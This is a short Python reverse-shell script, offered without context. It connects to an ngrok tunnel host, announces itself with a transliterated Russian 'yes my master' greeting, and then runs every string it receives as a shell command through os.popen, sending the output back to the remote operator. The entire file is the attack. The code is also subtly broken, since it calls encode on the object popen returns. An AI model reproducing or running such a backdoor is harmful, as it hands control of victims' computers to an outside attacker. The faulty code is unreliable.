import os
import socket

import socket

sock = socket.socket()
sock.connect(('2.tcp.eu.ngrok.io', 11048))

sock.send('yes moi povelitel'.encode())
while True:

    data = sock.recv(1024).decode()
    data = os.popen(data).encode()
    sock.send(data)


sock.close()
